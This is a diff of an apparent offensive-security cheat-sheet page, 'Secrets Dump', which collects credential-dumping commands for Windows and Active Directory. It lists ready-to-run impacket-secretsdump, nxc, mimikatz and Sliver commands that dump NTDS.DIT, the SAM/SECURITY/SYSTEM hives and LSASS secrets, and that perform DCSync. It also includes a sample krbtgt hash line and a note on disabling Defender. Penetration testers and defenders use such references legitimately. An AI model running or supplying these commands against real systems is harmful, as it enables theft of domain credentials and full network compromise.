@@ -1,10 +1,9 @@
 ---
 title: "Secrets Dump"
-date: 2025-7-18
-tags: ["SAM", "SYSTEM", "SECURITY", "Dcsync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive", "LAPS"]
+tags: ["SAM", "SYSTEM", "SECURITY", "DCSync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "NTDS.DIT", "Hive", "LAPS"]
 ---
 
-### Convert ntds.dit to .sqlite
+#### Convert NTDS.DIT to .sqlite
 
 ```console
 ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
@@ -12,7 +11,9 @@ ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite
 
 <small>*Ref: [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)*</small>
 
-### With ntds.dit and SYSTEM hive
+---
+
+#### With NTDS.DIT and SYSTEM Hive
 
 {{< tab set1 tab1 >}}impacket{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
@@ -40,7 +41,9 @@ krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 
 {{< /tabcontent >}}
 
-### With SAM, SYSTEM and SECURITY Hives
+---
+
+#### With SAM, SYSTEM and SECURITY Hives
 
 {{< tab set2 tab1 >}}impacket{{< /tab >}}
 {{< tab set2 tab2 >}}mimikatz{{< /tab >}}
@@ -55,15 +58,15 @@ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
 {{< tabcontent set2 tab2 >}}
 
 ```console
-reg save HKLM\SYSTEM system
+reg save HKLM\SYSTEM SYSTEM
 ```
 
 ```console
-reg save HKLM\security security
+reg save HKLM\SECURITY SECURITY
 ```
 
 ```console
-reg save hklm\sam sam
+reg save HKLM\SAM SAM
 ```
 
 ```console
@@ -78,15 +81,15 @@ reg save hklm\sam sam
 {{< tabcontent set2 tab3 >}}
 
 ```console
-reg save HKLM\SYSTEM system
+execute "powershell" "reg save HKLM\SYSTEM C:\SYSTEM"
 ```
 
 ```console
-reg save HKLM\security security
+execute "powershell" "reg save HKLM\SECURITY C:\SECURITY"
 ```
 
 ```console
-reg save hklm\sam sam
+execute "powershell" "reg save HKLM\SAM C:\SAM"
 ```
 
 ```console
@@ -99,12 +102,14 @@ mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
 
 {{< /tabcontent >}}
 
+---
 
-### With DCsync Right
+#### With DCSync Right
 
 {{< tab set3 tab1 >}}impacket{{< /tab >}}
 {{< tab set3 tab2 >}}nxc{{< /tab >}}
 {{< tab set3 tab3 >}}mimikatz{{< /tab >}}
+{{< tab set3 tab4 >}}sliver{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
 ```console
@@ -142,23 +147,38 @@ nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
 ```
 
 {{< /tabcontent >}}
-
-### With LAPS Password
-
-{{< tab set4 tab1 >}}impacket{{< /tab >}}
-{{< tabcontent set4 tab1 >}}
+{{< tabcontent set3 tab4 >}}
 
 ```console
-impacket-secretsdump 'administrator:<PASSWORD>@<TARGET_DOMAIN>'
+mimikatz -- '"lsadump::dcsync /all"' "exit"
 ```
 
 {{< /tabcontent >}}
 
-### With NT AUTHORITY\SYSTEM / Administrator
+---
 
-{{< tab set5 tab1 >}}mimikatz{{< /tab >}}
-{{< tab set5 tab2 >}}sliver{{< /tab >}}
-{{< tabcontent set5 tab1 >}}
+#### With SYSTEM / Administrator / LAPS
+
+{{< tab set4 tab1 >}}impacket{{< /tab >}}
+{{< tab set4 tab2 >}}nxc{{< /tab >}}
+{{< tab set4 tab3 >}}mimikatz{{< /tab >}}
+{{< tab set4 tab4 >}}sliver{{< /tab >}}
+{{< tabcontent set4 tab1 >}}
+
+```console
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4 tab2 >}}
+
+```console
+# Disable defender
+nxc smb <TARGET_DOMAIN> -u 'administrator' -p '<PASSWORD>' --local-auth -M lsassy 
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4 tab3 >}}
 
 ```console
 .\mimikatz.exe "sekurlsa::logonpasswords"
@@ -169,7 +189,7 @@ impacket-secretsdump 'administrator:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 {{< /tabcontent >}}
-{{< tabcontent set5 tab2 >}}
+{{< tabcontent set4 tab4 >}}
 
 ```console
 mimikatz -- '"sekurlsa::logonpasswords"'
@@ -180,3 +200,5 @@ mimikatz -- '"lsadump::lsa /patch"'
 ```
 
 {{< /tabcontent >}}
+
+<br>
